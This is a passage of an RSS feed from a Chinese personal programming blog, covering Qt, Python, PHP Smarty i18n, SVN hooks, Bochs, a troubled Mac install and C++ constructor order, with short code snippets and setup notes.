Key.Down)//↓<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; direct = (direct != Direction.UP ? Direction.DOWN : direct);<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else if(e.Key == Key.Space &amp;&amp; timer.IsEnabled)//空格键暂停<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; timer.Stop();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; <br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(!timer.IsEnabled)//任意键继续<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; timer.Start();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Walk();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// 窗口的大小改变时，改变两个边界变量W H<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;/summary&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="sender"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /// &lt;param name="e"&gt;&lt;/param&gt;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; private void Window_SizeChanged(object sender, SizeChangedEventArgs e)<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.W = Convert.ToInt32(this.cavas.ActualWidth) / 10 * 10.0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; this.H = Convert.ToInt32(this.cavas.ActualHeight) / 10 * 10.0;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>&nbsp;&nbsp;&nbsp; }<br>}<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009535108234/</guid>
    </item>
    <item>
      <title>
<![CDATA[Websphere Business Integrated Developer WID]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720083221057897/</link>
      <description>
<![CDATA[<P>Websphere Business Modeler； Websphere Business Integrated Developer; Websphere Business Monitor; Websphere Business Monitor Development </P>
<P>1。安装</P>
<P>下载WID6.1.0的4个包，然后解压缩到同一个包里(如果解压到不同的包里，虽然也能开始安装，但会跳出NullPointerException异常）。然后执行launchpad.exe开始安装。</P>
<P>安装完成后再安装MMDT，好像6.1.0的MMDT不能用，只能安装6.1.1的</P>
<P>2。开发</P>
<P>3.</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>WAS</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720083221057897/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下使用Groovy]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201052992931606/</link>
      <description>
<![CDATA[$ sudo apt-get install groovy<br>groovy的UI有两个，一个是基于X的groovyConsole，另一个是基于命令行的groovysh<br>$ groovysh<br>groovy:000&gt; println "Hello, Worlp"<br>Hello, Worlp<br>===&gt; null<br>groovy:000&gt; l=[1,2,3,4];<br>===&gt; [1, 2, 3, 4]<br>groovy:000&gt; quit<br>$ <br>难道要从Python再跳回Java？]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201052992931606/</guid>
    </item>
    <item>
      <title>
<![CDATA[程序员每天该做的事]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720078268103096/</link>
      <description>
<![CDATA[<P>&nbsp;</P>
<P>1、总结自己一天任务的完成情况 <BR>最好的方式是写工作日志，把自己今天完成了什么事情，遇见了什么问题都记录下来，日后翻看好处多多 </P>
<P>2、考虑自己明天应该做的主要工作 <BR>把明天要做的事情列出来，并按照优先级排列，第二天应该把自己效率最高的时间分配给最重要的工作 </P>
<P>3、考虑自己一天工作中失误的地方，并想出避免下一次再犯的方法 <BR>出错不要紧，最重要的是不要重复犯相同的错误，那是愚蠢 </P>
<P>4、考虑自己一天工作完成的质量和效率能否还能提高 <BR>一天只提高1%，365天你的效率就能提高多少倍你知道吗？ (1+0.01)^365 = 37 倍 </P>
<P>5、看一个有用的新闻网站或读一张有用的报纸，了解业界动态 <BR>闭门造车是不行的，了解一下别人都在做什么，对自己能带来很多启示 </P>
<P>6、记住一位同事的名字及其特点 <BR>你认识公司的所有同事吗？你了解他们吗？ </P>
<P>7、清理自己的代码 <BR>今天完成的代码，把中间的调试信息，测试代码清理掉，按照编码风格整理好，注释都写好了吗？ </P>
<P>8、清理自己的桌面 <BR>当日事当日毕，保持清洁干劲的桌面才能让你工作时不分心，程序员特别要把电脑的桌面清理干净 </P>
<P>程序员每周该做的事 <BR>1、向你的老板汇报一次工作 <BR>让你的老板知道你在做什么，这很重要。可以口头、书面、邮件，看你老板的工作方式而定 </P>
<P>2、进行一次自我总结（非正式） <BR>这周之内自己表现得怎么样？该加分还是扣分？ </P>
<P>3、制定下周计划 <BR>把下周要做的事情列出来，一样要分清楚优先级 </P>
<P>4、整理自己的文件夹、书柜和电脑文件 <BR>把桌面以外的地方也要清理干净，电脑的文件夹，收到的邮件，把过时的垃圾全部清理掉 </P>
<P>5、与一个非公司的朋友沟通 <BR>它山之石，可以攻玉 </P>
<P>6、看一本杂志 <BR>找一本适合自己的专业杂志 </P>
<P>7、纠正自己或同事一个细节上的不正确做法 <BR>《细节决定成败》看过了吗？没看过强烈建议先看看 </P>
<P>程序员每月该做的事 <BR>1、至少和一个同事一起吃饭或喝茶 <BR>不光了解自己工作伙伴的工作，还要了解他们的生活 </P>
<P>2、自我考核一次 <BR>相对正式地考核自己一下，你对得起这个月的工资吗？ </P>
<P>3、对你的同事考核一次 <BR>你的同事表现怎么样？哪些人值得学习，哪些人需要帮助？ </P>
<P>3、制定下月的计划，确定下月的工作重点 </P>
<P>4、总结自己工作质量改进状况 <BR>自己的质量提高了多少？ </P>
<P>5、有针对性地对一项工作指标做深入地分析并得出改进的方案 <BR>可以是对自己的，也可以是对公司的，一定要深入地分析后拿出自己的观点来。要想在老板面前说得上话，做的成事，工作上功夫要做足。 </P>
<P>6、与老板沟通一次 <BR>最好是面对面地沟通，好好表现一下自己，虚心听取老板的意见，更重要的是要了解老板当前关心的重点 </P>
<P>程序员每年该做的事 <BR>1、年终总结 <BR>每个公司都会做的事情，但你真正认真地总结过自己吗？ </P>
<P>2、兑现给自己、给家人的承诺 <BR>给老婆、儿子的新年礼物买了没有？给自己的呢？ </P>
<P>3、下年度工作规划 <BR>好好想想自己明年的发展目标，争取升职/加薪、跳槽还是自己出来干？ </P>
<P>4、掌握一项新技术 <BR>至少是一项，作为程序员一年要是一项新技术都学不到手，那就一定会被淘汰。 <BR>掌握可不是看本书就行的，要真正懂得应用，最好你能够写一篇教程发表到你的blog </P>
<P>5、推出一种新产品 <BR>可以是一个真正的产品，也可以只是一个类库，只要是你创造的东西就行，让别人使用它，也为世界作点贡献。当然如果真的很有价值，收点注册费也是应该的 </P>
<P>6、与父母团聚一次 <BR>常回家看看，常回家看看 <BR></P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Mood</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720078268103096/</guid>
    </item>
    <item>
      <title>
<![CDATA[QGLWidget的双缓存反而使帧率降低]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720103147847319/</link>
      <description>
<![CDATA[在glut窗口下使用双缓存进行渲染，可以达到60FPS，在QGLWidget下，也可以达到60FPS<br>然后在QGLWidget中启用双缓存<br>首先在initializeGL()中加入一句：<br><span style="font-weight: bold;">this-&gt;format().setDoubleBuffer(true);</span><br>然后在paintGL()中加入一句：<br><span style="font-weight: bold;">this-&gt;swapBuffers()</span><br>结果显示效果一样，帧率竟然降到了30FPS<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Graphics</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720103147847319/</guid>
    </item>
    <item>
      <title>
<![CDATA[SVNNotify邮件通知乱码问题]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720096911540412/</link>
      <description>
<![CDATA[网上多数都是在pl中进行字符转换<br>实际上只要在post-commit里加一句话就可以了<br>REPOS="$1"<br>REV="$2"<br><span style="color: rgb(255, 0, 0);">export LANG="en_US.UTF-8"</span><br><br>/usr/bin/svnnotify ...<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Develop</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720096911540412/</guid>
    </item>
    <item>
      <title>
<![CDATA[smarty实现i18n]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009105114051262/</link>
      <description>
<![CDATA[<font style="font-family: 黑体;" size="4">分三步：</font><br>1. 判断客户端浏览器语言<br>2. 加载相应的语言文件<br>3. 显示<br><font style="font-family: 黑体;" size="4">详细步骤如下：</font><br><font style="font-family: 宋体;" size="3">首先判断客户浏览器语言：</font><br>$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 4);<br>
if(preg_match("/zh-c/i", $lang))<br>&nbsp; 加载中文语言文件<br>else if (preg_match("/en/i", $lang))<br>&nbsp; 加载英文语言文件<br>else if ...<br>&nbsp; 加载相应语言文件<br>else<br>&nbsp; 加载默认语言文件<br><font size="3">然后加载相应的语言文件</font><br>$smarty-&gt;config_load('zh_CN.lang')<br>...<br><font size="3">最后在tpl中显示相应的字符串</font><br>{#hello#}<br><br><font style="font-family: 黑体;" size="4">源代码如下：</font><br>============i18n.php================================<br>&lt;?php<br>require_on<wbr>ce dirname(__FILE__). '/smarty/libs/Smarty.class.php';<br>$smarty = new Smarty();<br>$smarty-&gt;template_dir =dirname(__FILE__)."/smarty/templates";<br>$smarty-&gt;compile_dir =dirname(__FILE__)."/smarty/templates_c";<br>$smarty-&gt;config_dir = dirname(__FILE__)."/smarty/configs";<br>$smarty-&gt;cache_dir =dirname(__FILE__)."/smarty/cache";<br>$lang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 4);<br>if(preg_match("/zh-c/i", $lang))<br>&nbsp;&nbsp;&nbsp; $smarty-&gt;config_load('zh_CN.lang');<br>else if (preg_match("/zh/i", $lang))<br>&nbsp;&nbsp;&nbsp; $smarty-&gt;config_load('zh_TW.lang');<br>else if (preg_match("/en/i", $lang))<br>&nbsp;&nbsp;&nbsp; $smarty-&gt;config_load('en_US.lang');<br>else if (preg_match("/fr/i", $lang))<br>&nbsp;&nbsp;&nbsp; $smarty-&gt;config_load('fr_FR.lang');<br>else{<br>&nbsp;&nbsp;&nbsp; if (preg_match("/de/i", $lang))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ;<br>&nbsp;&nbsp;&nbsp; else if (preg_match("/jp/i", $lang))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ;<br>&nbsp;&nbsp;&nbsp; else if (preg_match("/ko/i", $lang))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ;<br>&nbsp;&nbsp;&nbsp; else if (preg_match("/es/i", $lang))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ;<br>&nbsp;&nbsp;&nbsp; else if (preg_match("/sv/i", $lang))<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ;<br>&nbsp;&nbsp;&nbsp; else <br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; ;<br>&nbsp;&nbsp;&nbsp; $smarty-&gt;config_load('en_US.lang');<br>}<br>$smarty-&gt;display('i18n.tpl');<br>?&gt;<br>============smarty/templates/i18n.tpl================================<br>{#hello#} <br>============smarty/configs/zh_CN.lang================================<br>hello=你好<br>============smarty/configs/en_US.lang================================<br>hello=Hello<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009105114051262/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下使用Bochsdbg]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201001902924834/</link>
      <description>
<![CDATA[在Windows下作用bochsdbg习惯了，在Ubuntu下，发现bochs包里竟然没有bochsdbg，要自己编译<br>$ apt-get source bochs<br>$ cd bochs-2.3.7<br>$ ./configure --enable-debugger --enable-disasm --prefix=/usr<br>$ make<br>$ sudo cp bochs /usr/bin/bochsdbg<br><br>编译错误解决办法<br>错误一： ISO C++ forbids declaration of ‘hash_map’ with no type<br>修改：加入hash_map的命名空间，修改bx_debug/symbols.cc<br>#include &lt;ext/hash_map&gt;<br>using namespace __gnu_cxx;<br>错误二：没有找到yacc命令<br>修改：安装yacc包 <br>sudo apt-get install bison++<br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201001902924834/</guid>
    </item>
    <item>
      <title>
<![CDATA[Qt实现窗口自动隐藏]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009101611345842/</link>
      <description>
<![CDATA[将窗口拖到窗口最上方，或最左方，移开鼠标，窗口自动隐藏。<br>将鼠标移到窗口边界，窗口自动弹出，类音速启动效果<br><br>from PyQt4.QtGui imp<wbr>ort *<br>from PyQt4.QtCore imp<wbr>ort *<br><br>class Geometry(QDialog):&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;def __init__ (self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;QDialog.__init__(self)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.frame=1<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;layout=QGridLayout(self)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btnAbout=QToolButton()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btnAbout.setText('About Qt')<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btnAbout.setIcon(QIcon('hjz.png'))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;btnAbout.setToolButtonStyle(Qt.ToolButtonTextUnderIcon)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;layout.addWidget(btnAbout,0,0,Qt.AlignTop|Qt.AlignLeft)<br><br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.connect(btnAbout,SIGNAL('clicked()'),self.slotAbout)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.setWindowFlags(Qt.WindowStaysOnTopHint)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.resize(300,200)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.show()<br><br>&nbsp;&nbsp; &nbsp;def slotAbout(self):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;QMessageBox.aboutQt(self)<br>&nbsp;&nbsp; &nbsp;def enterEvent(self, evt):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.activateWindow()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(self.x() == self.frame-self.width()):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.move(-self.frame,self.y())<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif(self.y() == self.frame-self.height()+self.y()-self.geometry().y()):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.move(self.x(),-self.frame)<br>&nbsp;&nbsp; &nbsp;def leaveEvent(self,evt):&nbsp;&nbsp; &nbsp;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;cx,cy=QCursor.pos().x(),QCursor.pos().y()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(cx &gt;= self.x() and cx &lt;= self.x()+self.width()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;and cy &gt;= self.y() and cy &lt;= self.geometry().y()):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return#title bar<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif(self.x() &lt; 0 and QCursor.pos().x()&gt;0):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.move(self.frame-self.width(),self.y())<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;elif(self.y() &lt; 0 and QCursor.pos().y()&gt;0):<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;self.move(self.x(), self.frame-self.height()+self.y()-self.geometry().y())<br><br>if __name__=='__main__':<br>&nbsp;&nbsp; &nbsp;app=QApplication([])<br>&nbsp;&nbsp; &nbsp;win=Geometry()<br>&nbsp;&nbsp; &nbsp;app.setActiveWindow(win)<br>&nbsp;&nbsp; &nbsp;app.exec_()<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372009101611345842/</guid>
    </item>
    <item>
      <title>
<![CDATA[Python之道：一生二 二生三 三生万物]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200952653332343/</link>
      <description>
<![CDATA[<fneBlog-ont style="fneBlog-ont-weight: bold;" size="4">一切皆是对象</fneBlog-ont><br style="fneBlog-ont-weight: bold;">和Java类似，Python的所有对象都有一个共同的基类：PyObject。天地如卵，PyObject 就是天地未分的“元”<br>须弥芥子，一粒沙即大千世界。PyObject 还有类型：PyBaseObject_Type；PyBaseObject_Type 还有类型：PyType_Type；PyType_Type 的类型是自身：PyType_Type。<br style="fneBlog-ont-weight: bold;"><fneBlog-ont style="fneBlog-ont-weight: bold;" size="4">一生二<br></fneBlog-ont>混沌初分，清者为天，浊者为敌，阴阳始分。Python中的对象可以大致分为两类：定长对象和变长对象：<br>定长对象者，若int。int对象的值无论多大，只要4个字节足矣。使用PyObjecty_HEAD保存对象的头信息。<br>变长对象者，若string。string对象的长度几何？不可未卜先知也。使用PyObject_VAR_HEAD保存对象的头信息。<br><fneBlog-ont style="fneBlog-ont-weight: bold;" size="4">二生三<br></fneBlog-ont>太极生两仪，两仪生四象，四象生八卦，八八六十四卦。阴阳相生，无可穷尽。<br>PyObject 分为定长与变长两种，变长对象又可以再分为两种：不可变变长对象和可变变长对象。<br>不可变变长对象者，一旦生成，大小不可变。若string，每个字符串都是不可变的，string虽然支持加号操作符，但是每次加法都是构建的新对象，而不是在原来的字符串上修改。如"hello"+"world"，实际包含了三个对象<br>可变变长对象者，生成之后，仍可增删改查。若List，大小无限（当然是在不用完内存的前提下）<br><fneBlog-ont style="fneBlog-ont-weight: bold;" size="4">三生万物</fneBlog-ont><br>由定长对象、不可变变长对象、可变变长对象这三种基本类型，就可以表示Python中所有的数据类型。<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200952653332343/</guid>
    </item>
    <item>
      <title>
<![CDATA[Mac受难记]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372010425101014708/</link>
      <description>
<![CDATA[1. 准备安装Mac，首先分出来两个40G的FAT32分区，卷标定为install和Mac，然后使用硬盘助手将ISO镜像写入install分区，然后用变色龙写入启动配置信息<br>2.重启电脑，发现MBR损坏，不能启动。好吧，先不管他，使用PE光盘的光盘GRUB启动<br>root (hd0,0)<br>chainloader +1<br>boot<br>3.选择变色龙选项，进入变色龙启动菜单，遗憾的是，没有出现期望中的苹果图标，好吧，看来是分区有问题，使用光盘的grub重启<br>root (hd0,0)<br>chainloader +1<br>boot<br>4. 选择Windows选项，进入Windows，然后使用PQ将install分区的分区ID改为AF，因为这个分区应该是HFS＋格式的，可能由于某些原因，导致硬盘助手该分区格式没有成功。改完分区ID后使用光盘的grub重启<br>root (hd0,0)<br>
chainloader +1<br>
boot<br>5. 选择变色龙选项，进入变色龙启动菜单，好吧，这次苹果图标终于出来了，使用键盘右键选中，然后回车，进入灰苹果界面，很不错<br>6.然后等了10分钟，还是灰苹果界面，好吧，不得不承认，卡住了，重启进入BIOS<br>7. 苹果硬盘要求AHCI，修改BIOS，“将SATA硬盘识别为”从IDE改为AHCI，重启，使用光盘grub重启<br>
root (hd0,0)<br>
chainloader +1<br>
boot<br>8. 终于可以正常安装了，大约10分钟后，提示安装完成，重启，好吧，使用光盘grub重启<br>root (hd0,0)<br>chainloader +1<br>boot<br>9. 选择变色龙菜单，发现Mac分区已经变成苹果图标了，理论上讲，Mac已经安装成功了。选择Mac分区，回车，传说中的灰苹果又停留了10分钟，好吧，我承认，安装失败了，使用光盘grub重启<br>root (hd0,0)<br>chainloader +1<br>boot<br>10. 先不管Mac了，选择Windows，因为我要查些资料，突然Windows蓝屏了<br>11. 想起来了，Windows没有自带SATA驱动，所以如果在BIOS里选择SATA硬盘为AHCI模式，就会重启，如果在BIOS里选择SATA硬盘为IDE兼容硬盘，Mac就没办法用（即使选了，也不一定能用），好吧，我选择放弃Mac了<br>12. 重启进入BIOS，将SATA硬盘改回IDE兼容模式，使用光盘grub引导<br>root (hd0,0)<br>chainloader +1<br>boot<br>13. 进入Windows，将install分区和mac分区删除，然后在Windows的磁盘管理里，做了一件很蠢的事，格式化一块分区，比我更蠢的Windows磁盘管理工具报告了一个错误后就退出了，好吧，我安慰自己，这很正常，虽然格式化很简单，但是我不应该用Windows的磁盘管理的，打开我的电脑，发现了一件很刺激的，让我5秒钟石化的事，我的Win7分区没了，我的xx分区没了，我的项目文件分区也没了。这种事在本科毕业的时候发生过，硬盘60G数据全部格式化，但那之前做过一次备份，损失不是太严重。这次确实致命打击了。<br>14. 淡定，我只格式化一个空分区，而且失败了，所以应该只是硬盘分区表损坏，百度搜索分区修复工具，DiskGenius，大家都说好，我以前做U盘分区的时候也用过，很好很强大，搜索分区，保存分区表，修复MBR<br>15. 现在一切正常，恢复以前XP+Win7的双系统状态。<br><span id="reply_content_912843"><pre>回首向来萧瑟处,归去,也无风雨也无晴。</pre></span>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010425101014708/</guid>
    </item>
    <item>
      <title>
<![CDATA[父类、构造函数、成员对象的调用时机]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201010633157934/</link>
      <description>
<![CDATA[在使用new创建对象时，主要完成四项工作：<br>1 构造父类成员对象<br>2 构造子类成员对象<br>3 调用父类构造函数<br>4 调用子类构造函数<br>这四项工作的时间顺序是怎样的呢？<br>原则是：<b>先父类后子类，先成员后函数</b><br><b>一级继承</b><br>例如：<br>class X{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X(){cout&lt;&lt;"X";}<br>};<br>class A{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X x1;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A(){cout&lt;&lt;"A";}<br>};<br>class B: public A{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X x2;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; B(){cout&lt;&lt;"B";}<br>};<br>int main(){<br>&nbsp;&nbsp;&nbsp; B b;<br>}<br>构造对象B时，根据第1个原则：先父类后子类，先构造A(1)，然后构造B(2)。<br>构造A(1):<br>&nbsp;然后根据第2个原则，先成员后函数，先构造A的成员x1,即先调用X构造函数，然后再调用A构造函数<br>构造B(2):<br>&nbsp;根据第2个原则，先成员后函数，先构造B的成员x2,即先调用X构造函数，然后再调用B构造函数<br>因此输出为:<br>XAXB<br><br><b>多级继承</b><br>在一级继承中这个比较容易分析，在多级继承中就会复杂些，但坚持这两个原则，细心分析也不会出问题的。<br>#include &lt;iostream&gt;<br>#include &lt;fstream&gt;<br>#include &lt;cstring&gt;<br>using namespace std;<br>class X{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X(){cout&lt;&lt;"X";}<br>};<br>class Y{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y(){cout&lt;&lt;"Y";}<br>};<br><br>class A{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A(){cout&lt;&lt;"A";}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~A(){cout&lt;&lt;"~A";}<br>};<br>class B: public A{<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y x;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A a;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Y y;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; B(){cout&lt;&lt;"B";}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~B(){cout&lt;&lt;"~B";}<br>};<br>class C: public B{<br>&nbsp;&nbsp;&nbsp; protected:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X x;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; B b;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; A a;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; X y;<br>&nbsp;&nbsp;&nbsp; public:<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; C(){cout&lt;&lt;"C";}<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ~C(){cout&lt;&lt;"~C";}<br>};<br>int main(){<br>&nbsp;&nbsp;&nbsp; C *c = new C();<br>&nbsp;&nbsp;&nbsp; delete 